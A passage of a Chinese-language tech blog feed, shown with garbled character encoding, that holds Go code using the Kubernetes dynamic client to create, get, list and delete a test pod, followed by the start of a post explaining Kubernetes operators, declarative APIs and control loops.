	<span class="nx">resource</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">getDynamicResource</span><span class="p">(</span><span class="nx">gvk</span><span class="p">,</span> <span class="nx">namespace</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="nx">create</span> <span class="o">:=</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;creating pod......&#34;</span><span class="p">)</span>
		<span class="nx">pod</span> <span class="o">:=</span> <span class="nx">corev1</span><span class="p">.</span><span class="nx">Pod</span><span class="p">{</span>
			<span class="nx">TypeMeta</span><span class="p">:</span> <span class="nx">metav1</span><span class="p">.</span><span class="nx">TypeMeta</span><span class="p">{},</span>
			<span class="nx">ObjectMeta</span><span class="p">:</span> <span class="nx">metav1</span><span class="p">.</span><span class="nx">ObjectMeta</span><span class="p">{</span>
				<span class="nx">Name</span><span class="p">:</span> <span class="s">&#34;test-pod&#34;</span><span class="p">,</span>
			<span class="p">},</span>
			<span class="nx">Spec</span><span class="p">:</span> <span class="nx">corev1</span><span class="p">.</span><span class="nx">PodSpec</span><span class="p">{</span>
				<span class="nx">Containers</span><span class="p">:</span> <span class="p">[]</span><span class="nx">corev1</span><span class="p">.</span><span class="nx">Container</span><span class="p">{</span>
					<span class="p">{</span>
						<span class="nx">Name</span><span class="p">:</span>  <span class="s">&#34;test-busybox&#34;</span><span class="p">,</span>
						<span class="nx">Image</span><span class="p">:</span> <span class="s">&#34;busybox&#34;</span><span class="p">,</span>
					<span class="p">},</span>
				<span class="p">},</span>
			<span class="p">},</span>
		<span class="p">}</span>
		<span class="nx">obj</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">runtime</span><span class="p">.</span><span class="nx">DefaultUnstructuredConverter</span><span class="p">.</span><span class="nf">ToUnstructured</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">pod</span><span class="p">)</span>
		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
			<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
		<span class="p">}</span>
		<span class="kd">var</span> <span class="nx">unstructured</span> <span class="nx">unstructured</span><span class="p">.</span><span class="nx">Unstructured</span>
		<span class="nx">unstructured</span><span class="p">.</span><span class="nx">Object</span> <span class="p">=</span> <span class="nx">obj</span>
		<span class="k">if</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">resource</span><span class="p">.</span><span class="nf">Create</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">unstructured</span><span class="p">,</span> <span class="nx">metav1</span><span class="p">.</span><span class="nx">CreateOptions</span><span class="p">{});</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
			<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="nf">create</span><span class="p">()</span>

	<span class="nx">get</span> <span class="o">:=</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;getting pod......&#34;</span><span class="p">)</span>
		<span class="nx">unstructured</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">resource</span><span class="p">.</span><span class="nf">Get</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="s">&#34;test-pod&#34;</span><span class="p">,</span> <span class="nx">metav1</span><span class="p">.</span><span class="nx">GetOptions</span><span class="p">{})</span>
		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
			<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
		<span class="p">}</span>
		<span class="kd">var</span> <span class="nx">pod</span> <span class="nx">corev1</span><span class="p">.</span><span class="nx">Pod</span>
		<span class="nx">err</span> <span class="p">=</span> <span class="nx">runtime</span><span class="p">.</span><span class="nx">DefaultUnstructuredConverter</span><span class="p">.</span>
			<span class="nf">FromUnstructured</span><span class="p">(</span><span class="nx">unstructured</span><span class="p">.</span><span class="nx">Object</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">pod</span><span class="p">)</span>
		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
			<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
		<span class="p">}</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">pod</span><span class="p">.</span><span class="nx">Name</span><span class="p">)</span>
	<span class="p">}</span>
	<span class="nf">get</span><span class="p">()</span>

	<span class="nx">list</span> <span class="o">:=</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;listing pods......&#34;</span><span class="p">)</span>
		<span class="nx">unstructuredList</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">resource</span><span class="p">.</span><span class="nf">List</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">metav1</span><span class="p">.</span><span class="nx">ListOptions</span><span class="p">{})</span>
		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
			<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
		<span class="p">}</span>
		<span class="kd">var</span> <span class="nx">podList</span> <span class="p">[]</span><span class="o">*</span><span class="nx">corev1</span><span class="p">.</span><span class="nx">Pod</span>
		<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">unstructured</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">unstructuredList</span><span class="p">.</span><span class="nx">Items</span> <span class="p">{</span>
			<span class="kd">var</span> <span class="nx">pod</span> <span class="nx">corev1</span><span class="p">.</span><span class="nx">Pod</span>
			<span class="nx">err</span> <span class="o">:=</span> <span class="nx">runtime</span><span class="p">.</span><span class="nx">DefaultUnstructuredConverter</span><span class="p">.</span>
				<span class="nf">FromUnstructured</span><span class="p">(</span><span class="nx">unstructured</span><span class="p">.</span><span class="nx">Object</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">pod</span><span class="p">)</span>
			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
				<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
			<span class="p">}</span>
			<span class="nx">podList</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">podList</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">pod</span><span class="p">)</span>
		<span class="p">}</span>
		<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">pod</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">podList</span> <span class="p">{</span>
			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">pod</span><span class="p">.</span><span class="nx">Namespace</span><span class="p">,</span> <span class="nx">pod</span><span class="p">.</span><span class="nx">Name</span><span class="p">)</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="nf">list</span><span class="p">()</span>

	<span class="nx">delete</span> <span class="o">:=</span> <span class="kd">func</span><span class="p">(){</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;deleting pod...&#34;</span><span class="p">)</span>
		<span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">resource</span><span class="p">.</span><span class="nf">Delete</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="s">&#34;test-pod&#34;</span><span class="p">,</span> <span class="nx">metav1</span><span class="p">.</span><span class="nx">DeleteOptions</span><span class="p">{});</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
			<span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="nb">delete</span><span class="p">()</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">mustInitClient</span><span class="p">()</span> <span class="p">{</span>
	<span class="nx">once</span><span class="p">.</span><span class="nf">Do</span><span class="p">(</span><span class="kd">func</span><span class="p">()</span> <span class="p">{</span>

		<span class="kd">var</span> <span class="nx">configPath</span> <span class="kt">string</span>

		<span class="k">if</span> <span class="nx">value</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Getenv</span><span class="p">(</span><span class="s">&#34;KUBECONFIG&#34;</span><span class="p">);</span> <span class="nx">value</span> <span class="o">!=</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
			<span class="nx">configPath</span> <span class="p">=</span> <span class="nx">value</span>
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="nx">configPath</span> <span class="p">=</span> <span class="s">&#34;~/.kube/config&#34;</span>
		<span class="p">}</span>

		<span class="nx">config</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">clientcmd</span><span class="p">.</span><span class="nf">BuildConfigFromFlags</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="nx">configPath</span><span class="p">)</span>
		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
			<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
		<span class="p">}</span>

		<span class="nx">discoveryClient</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">discovery</span><span class="p">.</span><span class="nf">NewDiscoveryClientForConfig</span><span class="p">(</span><span class="nx">config</span><span class="p">)</span>
		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
			<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
		<span class="p">}</span>

		<span class="nx">dynamicClient</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">dynamic</span><span class="p">.</span><span class="nf">NewForConfig</span><span class="p">(</span><span class="nx">config</span><span class="p">)</span>
		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
			<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
		<span class="p">}</span>
	<span class="p">})</span>
<span class="p">}</span>

<span class="c1">// getDynamicResource convert GVK into dynamic resource
</span><span class="c1"></span><span class="kd">func</span> <span class="nf">getDynamicResource</span><span class="p">(</span><span class="nx">gvk</span> <span class="o">*</span><span class="nx">schema</span><span class="p">.</span><span class="nx">GroupVersionKind</span><span class="p">,</span> <span class="nx">namespace</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="nx">dr</span> <span class="nx">dynamic</span><span class="p">.</span><span class="nx">ResourceInterface</span><span class="p">,</span> <span class="nx">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>

	<span class="nx">mapper</span> <span class="o">:=</span> <span class="nx">restmapper</span><span class="p">.</span><span class="nf">NewDeferredDiscoveryRESTMapper</span><span class="p">(</span><span class="nx">memory</span><span class="p">.</span><span class="nf">NewMemCacheClient</span><span class="p">(</span><span class="nx">discoveryClient</span><span class="p">))</span>
	<span class="nx">mapping</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">mapper</span><span class="p">.</span><span class="nf">RESTMapping</span><span class="p">(</span><span class="nx">gvk</span><span class="p">.</span><span class="nf">GroupKind</span><span class="p">(),</span> <span class="nx">gvk</span><span class="p">.</span><span class="nx">Version</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;CRD has not been registed, err: %s&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="nx">mapping</span><span class="p">.</span><span class="nx">Scope</span><span class="p">.</span><span class="nf">Name</span><span class="p">()</span> <span class="o">==</span> <span class="nx">meta</span><span class="p">.</span><span class="nx">RESTScopeNameNamespace</span> <span class="p">{</span>
		<span class="nx">dr</span> <span class="p">=</span> <span class="nx">dynamicClient</span><span class="p">.</span><span class="nf">Resource</span><span class="p">(</span><span class="nx">mapping</span><span class="p">.</span><span class="nx">Resource</span><span class="p">).</span><span class="nf">Namespace</span><span class="p">(</span><span class="nx">namespace</span><span class="p">)</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
		<span class="nx">dr</span> <span class="p">=</span> <span class="nx">dynamicClient</span><span class="p">.</span><span class="nf">Resource</span><span class="p">(</span><span class="nx">mapping</span><span class="p">.</span><span class="nx">Resource</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="k">return</span>
<span class="p">}</span>

</code></pre></div><h2 id="å‚è€ƒ">å‚è€ƒ</h2>
<ul>
<li>ã€Škubernetesæºç å‰–æã€‹</li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>èŠä¸€èŠkubernetes operator</title>
			<link>https://shankisme.com/posts/%E8%81%8A%E4%B8%80%E8%81%8Akubernetes-operator/</link>
			<pubDate>Tue, 07 Dec 2021 20:13:53 +0800</pubDate>
			
			<guid>https://shankisme.com/posts/%E8%81%8A%E4%B8%80%E8%81%8Akubernetes-operator/</guid>
			<description>å‰è¨€ å¾®æœåŠ¡å…´èµ·ï¼Œè®¸å¤šä¸šåŠ¡è¢«éƒ¨ç½²åœ¨äº†k8sä¸Šï¼Œå¤§å¤šæ•°ä¸šåŠ¡å¼€å‘äººå‘˜æ—¥å¸¸æ¥è§¦åˆ°çš„åŸºæœ¬æ˜¯build-inèµ„æº(ingress service deployment replicaset pod hpa)ï¼Œå› æ­¤ä¼šè®¤ä¸ºkubernetes(ä»¥ä¸‹ç®€ç§°k8s)æ˜¯ä¸€ä¸ªè®¾è®¡ä¼˜ç§€çš„paaså¹³å°ï¼Œåœ¨k8sä¸­åˆ›å»ºèµ„æºçš„äººå‘˜ä¼šè¢«ç§°ä¸ºyamlå·¥ç¨‹å¸ˆğŸ¤£ã€‚
è¿™ä¹ˆè¯´æ˜¾å¾—k8så¾ˆæ— èŠ, èµ„æºåªæ˜¯å¯¹è±¡çŠ¶æ€çš„æè¿°ï¼Œå®é™…æ‰§è¡ŒåŠ¨ä½œçš„æ˜¯k8sçš„ç»„ä»¶(kubelet kube-proxyç­‰)ï¼Œå¯ä»¥è¯´k8sçš„æ‰§è¡Œèƒ½åŠ›è¶³å¤Ÿå¼ºå¤§ï¼Œèƒ½åœ¨å­˜å‚¨ã€ç½‘ç»œã€å®¹å™¨ä¸Šç©å‡ºèŠ±ï¼Œä½ å®Œå…¨å¯ä»¥ç»„ç»‡è‡ªå·±çš„èµ„æºæ ¼å¼(crd)ï¼Œåˆ©ç”¨k8sçš„èƒ½åŠ›åšè‡ªå·±æƒ³åšçš„äº‹ï¼Œk8sæœ¬è´¨ä¸Šæ˜¯å¸¦æœ‰å¼ºå¤§æ‰§è¡ŒåŠ›çš„åˆ†å¸ƒå¼èµ„æºç®¡ç†å¹³å°ï¼Œè¿™ç§åŠ¨è¯-åè¯åˆ†ç¦»çš„è§£é‡Šåº”è¯¥èƒ½è®©ä½ æ›´å¥½åœ°ç†è§£k8sã€‚
å½“ä»Šè®¸å¤šå¯¹æ‰©å±•æ€§å¯ç”¨æ€§è¦æ±‚é«˜çš„é¡¹ç›®ï¼ˆTiDBç­‰ï¼‰ï¼Œæ›´é’çäºä½¿ç”¨k8sä½œä¸ºåŸºåº§ï¼Œè¿™æ ·çš„æ·±åº¦ç»“åˆåªä¼šè®©k8sè¶Šæ¥è¶Šæµè¡Œã€‚
å¾—ç›Šäºå¼ºå¤§çš„æ’ä»¶æœºåˆ¶ï¼Œk8sè¿˜èƒ½è‡ªå®šä¹‰èµ„æº(crd/cr)ï¼Œè‡ªå®šä¹‰controllerï¼Œè‡ªå®šä¹‰api server, è‡ªå®šä¹‰admission webhookï¼Œä»–ä»¬è®©ä½ èƒ½æœ‰æ•ˆç»„åˆk8sçš„æ‰§è¡ŒåŠ›ï¼Œåšä¸€äº›æœ‰é€»è¾‘çš„äº‹ã€‚å½“ä¸‹æœ€æµè¡Œçš„è«è¿‡äºç©crd+controlleräº†ã€‚
ä¸ºäº†è®©çœ‹å®˜æ›´å¥½çš„äº†è§£operatorï¼ˆcontroller + crd + crï¼‰ï¼Œå’±ä»¬ä»k8sä¸¤å¤§è®¾è®¡æ€æƒ³ï¼šå£°æ˜å¼APIã€æ§åˆ¶å¾ªç¯è¯´èµ·ã€‚
å£°æ˜å¼API å£°æ˜å¼ä¸ä¹‹ç›¸å¯¹çš„æ˜¯å‘½ä»¤å¼, å‘½ä»¤å¼é¡¾åæ€ä¹‰ï¼Œè®©ç›®æ ‡æŒ‰æŒ‡å®šå‘½ä»¤åšäº‹ï¼›è€Œå£°æ˜å¼åˆ™æ˜¯æä¾›ç›®æ ‡ä¸€ä¸ªæœŸæœ›çŠ¶æ€ï¼Œè®©ç›®æ ‡æœæœŸæœ›çŠ¶æ€å»å˜æ›´ã€‚
çœ‹å¾—å‡ºæ¥ï¼Œå‘½ä»¤å¼å¤Ÿç®€æ´ï¼Œä½†è¦èŠ±è´¹å·¨å¤§ä»£ä»·ä¿è¯å‘½ä»¤æ‰§è¡Œæ‹¥æœ‰åŸå­æ€§å¹‚ç­‰æ€§ã€‚
æä¾›æœŸæœ›çŠ¶æ€çœ‹ä¼¼å†—ä½™ï¼Œä½†åªè¦æœŸæœ›çŠ¶æ€èƒ½è¢«æ‰§è¡Œè€…è·å–åˆ°ï¼Œæ‰§è¡Œè€…å°±èƒ½ä¸æ–­å°è¯•ç€å»è¾¾æˆæœŸæœ›çŠ¶æ€ï¼Œè¿‡ç¨‹ç®€å•ã€‚
è€ŒAPIå˜›ï¼ŒæŒ‡çš„æ˜¯k8s apiserveræä¾›çš„RESTful httpæ¥å£ï¼Œåˆ›å»ºèµ„æºæ¥å£éœ€è¦æ¥æ”¶å®Œæ•´çš„èµ„æºæœŸæœ›çŠ¶æ€å®šä¹‰, æœŸæœ›çŠ¶æ€æŒ‡çš„å°±æ˜¯specä¸­çš„æè¿°ï¼Œä¸ä¹‹å¯¹åº”çš„å®é™…çŠ¶æ€ç”±æ‰§è¡Œè€…ï¼ˆcontrollerï¼‰è®°å½•åœ¨statusä¸­ã€‚
è¿™ä¹Ÿæ˜¯ä¸ºå•¥æˆ‘ä»¬åœ¨ç”¨kubectlæŸ¥çœ‹èµ„æºä¿¡æ¯çš„æ—¶å€™åå‡ºç°é¢å¤–çš„statuså­—æ®µï¼Œè¿™å®é™…ä¸Šæ˜¯æ‰§è¡Œè€…å¸®æˆ‘ä»¬è®°å½•çš„ï¼Œä¸“ä¸šç‚¹çš„å«æ³•æ˜¯è§„çº¦(spec) - çŠ¶æ€(status)åˆ†ç¦»ã€‚æ¯”å¦‚pod, é™¤äº†å…ƒä¿¡æ¯å¤–ï¼ŒçŠ¶æ€ä»specå’Œstatuså­—æ®µå¼€å§‹å±•å¼€ã€‚
type Pod struct { metav1.TypeMeta `json:&amp;#34;,inline&amp;#34;` metav1.ObjectMeta `json:&amp;#34;metadata,omitempty&amp;#34; protobuf:&amp;#34;bytes,1,opt,name=metadata&amp;#34;` Spec PodSpec `json:&amp;#34;spec,omitempty&amp;#34; protobuf:&amp;#34;bytes,2,opt,name=spec&amp;#34;` Status PodStatus `json:&amp;#34;status,omitempty&amp;#34; protobuf:&amp;#34;bytes,3,opt,name=status&amp;#34;` } æ§åˆ¶å¾ªç¯ï¼ˆcontrol loopï¼‰ èµ„æºçš„ç†æƒ³çŠ¶æ€å­˜å‚¨åœ¨k8sçš„apiserverä¸­ï¼Œä¸ºäº†è®©èµ„æºç”±å®é™…çŠ¶æ€å‘æœŸæœ›çŠ¶æ€é æ‹¢, æ‰§è¡Œè€…éœ€è¦ç›‘å¬èµ„æºæœŸæœ›çŠ¶æ€çš„å¢åˆ æ”¹äº‹ä»¶ï¼Œè¿™äº›äº‹ä»¶ä¼šè§¦å‘æ‰§è¡Œè€…ä»¥å®šæ—¶é‡å¤æ‰§è¡Œæ–¹å¼è°ƒç”¨å¯¹åº”çš„handlerå¤„ç†äº‹ä»¶, ç›´åˆ°æ»¡è¶³æœŸæœ›çŠ¶æ€ä¸ºæ­¢ï¼Œä¹‹åæ‰§è¡Œè€…å†æŠŠæ“ä½œç»“æœè®°å½•åˆ°å®é™…çŠ¶æ€ä¸­ã€‚
 æ‰§è¡Œè€… æˆ‘ä»¬çŸ¥é“ï¼Œkubeletæ˜¯k8sè‡ªå¸¦ç»„ä»¶ï¼Œä¸»è¦åŠŸèƒ½é€šè¿‡ç›‘å¬podæœŸæœ›çŠ¶æ€å˜åŒ–äº‹ä»¶å¹¶åšä¸€äº›äº‹ç¡®ä¿æœ¬åœ°çš„podå¤„äºæœŸæœ›çŠ¶æ€ã€‚
kube-proxyåŒæ ·ä¹Ÿä¼šå¤„ç†podçš„å¢åˆ æ”¹äº‹ä»¶ï¼Œå®ƒä¸æ–­åœ°åˆ·æ–°æœ¬æœºlinuxç½‘ç»œè®¾å¤‡çš„é…ç½®ï¼Œæ¥ç¡®ä¿podç½‘ç»œé€šç•…ã€‚
è¿˜æœ‰æˆ‘ä»¬å¸¸ç”¨çš„deploymentã€cronJobã€statefulsetç­‰ï¼Œå®ƒä»¬æ‹¥æœ‰è‡ªå·±çš„controlleråšæ§åˆ¶å¾ªç¯ï¼Œè¿™äº›controller è¿è¡Œåœ¨ç»„ä»¶controller-managerå†…ã€‚
ç„¶è€Œä¸åƒä¸Šé¢æåˆ°çš„å¤„ç†k8såŸç”Ÿèµ„æºçš„æ‰§è¡Œè€…ï¼Œè¿™æ¬¡æˆ‘ä»¬èŠçš„operator,ç”±crd(custom resource definition)ã€cr(custom resource)ã€controllerç»„æˆã€‚
crdç”¨æ¥æè¿°ä½ æƒ³åˆ›å»ºçš„èµ„æºåº”è¯¥æœ‰å“ªäº›å­—æ®µï¼Œcræ˜¯crdçš„å…·ä½“åŒ–å®ç°ï¼Œä¸å¯¹è±¡ï¼Œå¯¹è±¡å®ä¾‹ä¹‹é—´åŒºåˆ«ç±»ä¼¼ã€‚
æˆ‘ä»¬è‡ªå·±å®ç°çš„controlleræ§åˆ¶çš„ç›®æ ‡å°±æ˜¯cr, å®ƒçš„å®ç°åŸç†ç­‰åŒcontroller-managerä¸­çš„åŸç”Ÿcontrollerï¼š
  ä¾é informerçš„ListAndWatchæ–¹æ³•å°†æŒ‡å®šèµ„æºçš„çŠ¶æ€ç¼“å­˜åœ¨å†…å­˜ä¸­ï¼Œå¹¶ä¸æ–­ç›‘æ§çŠ¶æ€å˜åŒ–</description>
			<content type="html"><![CDATA[<h1 id="å‰è¨€">å‰è¨€</h1>
<p>å¾®æœåŠ¡å…´èµ·ï¼Œè®¸å¤šä¸šåŠ¡è¢«éƒ¨ç½²åœ¨äº†k8sä¸Šï¼Œå¤§å¤šæ•°ä¸šåŠ¡å¼€å‘äººå‘˜æ—¥å¸¸æ¥è§¦åˆ°çš„åŸºæœ¬æ˜¯build-inèµ„æº(ingress service deployment replicaset pod hpa)ï¼Œå› æ­¤ä¼šè®¤ä¸ºkubernetes(ä»¥ä¸‹ç®€ç§°k8s)æ˜¯ä¸€ä¸ªè®¾è®¡ä¼˜ç§€çš„paaså¹³å°ï¼Œåœ¨k8sä¸­åˆ›å»ºèµ„æºçš„äººå‘˜ä¼šè¢«ç§°ä¸º<del>yamlå·¥ç¨‹å¸ˆ</del>ğŸ¤£ã€‚</p>
<p>è¿™ä¹ˆè¯´æ˜¾å¾—k8så¾ˆæ— èŠ, èµ„æºåªæ˜¯å¯¹è±¡çŠ¶æ€çš„æè¿°ï¼Œå®é™…æ‰§è¡ŒåŠ¨ä½œçš„æ˜¯k8sçš„ç»„ä»¶(kubelet kube-proxyç­‰)ï¼Œå¯ä»¥è¯´k8sçš„æ‰§è¡Œèƒ½åŠ›è¶³å¤Ÿå¼ºå¤§ï¼Œèƒ½åœ¨å­˜å‚¨ã€ç½‘ç»œã€å®¹å™¨ä¸Šç©å‡ºèŠ±ï¼Œä½ å®Œå…¨å¯ä»¥ç»„ç»‡è‡ªå·±çš„èµ„æºæ ¼å¼(crd)ï¼Œåˆ©ç”¨k8sçš„èƒ½åŠ›åšè‡ªå·±æƒ³åšçš„äº‹ï¼Œk8sæœ¬è´¨ä¸Šæ˜¯å¸¦æœ‰å¼ºå¤§æ‰§è¡ŒåŠ›çš„åˆ†å¸ƒå¼èµ„æºç®¡ç†å¹³å°ï¼Œè¿™ç§åŠ¨è¯-åè¯åˆ†ç¦»çš„è§£é‡Šåº”è¯¥èƒ½è®©ä½ æ›´å¥½åœ°ç†è§£k8sã€‚</p>
<p>å½“ä»Šè®¸å¤šå¯¹æ‰©å±•æ€§å¯ç”¨æ€§è¦æ±‚é«˜çš„é¡¹ç›®ï¼ˆTiDBç­‰ï¼‰ï¼Œæ›´é’çäºä½¿ç”¨k8sä½œä¸ºåŸºåº§ï¼Œè¿™æ ·çš„æ·±åº¦ç»“åˆåªä¼šè®©k8sè¶Šæ¥è¶Šæµè¡Œã€‚</p>
<p>å¾—ç›Šäºå¼ºå¤§çš„æ’ä»¶æœºåˆ¶ï¼Œk8sè¿˜èƒ½è‡ªå®šä¹‰èµ„æº(crd/cr)ï¼Œè‡ªå®šä¹‰controllerï¼Œè‡ªå®šä¹‰api server, è‡ªå®šä¹‰admission webhookï¼Œä»–ä»¬è®©ä½ èƒ½æœ‰æ•ˆç»„åˆk8sçš„æ‰§è¡ŒåŠ›ï¼Œåšä¸€äº›æœ‰é€»è¾‘çš„äº‹ã€‚å½“ä¸‹æœ€æµè¡Œçš„è«è¿‡äºç©crd+controlleräº†ã€‚</p>
<p>ä¸ºäº†è®©çœ‹å®˜æ›´å¥½çš„äº†è§£operatorï¼ˆcontroller + crd + crï¼‰ï¼Œå’±ä»¬ä»k8sä¸¤å¤§è®¾è®¡æ€æƒ³ï¼š<code>å£°æ˜å¼API</code>ã€<code>æ§åˆ¶å¾ªç¯</code>è¯´èµ·ã€‚</p>
<h2 id="å£°æ˜å¼api">å£°æ˜å¼API</h2>
<p>å£°æ˜å¼ä¸ä¹‹ç›¸å¯¹çš„æ˜¯å‘½ä»¤å¼, å‘½ä»¤å¼é¡¾åæ€ä¹‰ï¼Œè®©ç›®æ ‡æŒ‰æŒ‡å®šå‘½ä»¤åšäº‹ï¼›è€Œå£°æ˜å¼åˆ™æ˜¯æä¾›ç›®æ ‡ä¸€ä¸ªæœŸæœ›çŠ¶æ€ï¼Œè®©ç›®æ ‡æœæœŸæœ›çŠ¶æ€å»å˜æ›´ã€‚</p>
<p>çœ‹å¾—å‡ºæ¥ï¼Œå‘½ä»¤å¼å¤Ÿç®€æ´ï¼Œä½†è¦èŠ±è´¹å·¨å¤§ä»£ä»·ä¿è¯å‘½ä»¤æ‰§è¡Œæ‹¥æœ‰åŸå­æ€§å¹‚ç­‰æ€§ã€‚</p>
<p>æä¾›æœŸæœ›çŠ¶æ€çœ‹ä¼¼å†—ä½™ï¼Œä½†åªè¦æœŸæœ›çŠ¶æ€èƒ½è¢«æ‰§è¡Œè€…è·å–åˆ°ï¼Œæ‰§è¡Œè€…å°±èƒ½ä¸æ–­å°è¯•ç€å»è¾¾æˆæœŸæœ›çŠ¶æ€ï¼Œè¿‡ç¨‹ç®€å•ã€‚</p>
<p>è€ŒAPIå˜›ï¼ŒæŒ‡çš„æ˜¯k8s apiserveræä¾›çš„RESTful httpæ¥å£ï¼Œåˆ›å»ºèµ„æºæ¥å£éœ€è¦æ¥æ”¶å®Œæ•´çš„èµ„æºæœŸæœ›çŠ¶æ€å®šä¹‰, æœŸæœ›çŠ¶æ€æŒ‡çš„å°±æ˜¯specä¸­çš„æè¿°ï¼Œä¸ä¹‹å¯¹åº”çš„å®é™…çŠ¶æ€ç”±æ‰§è¡Œè€…ï¼ˆcontrollerï¼‰è®°å½•åœ¨statusä¸­ã€‚</p>
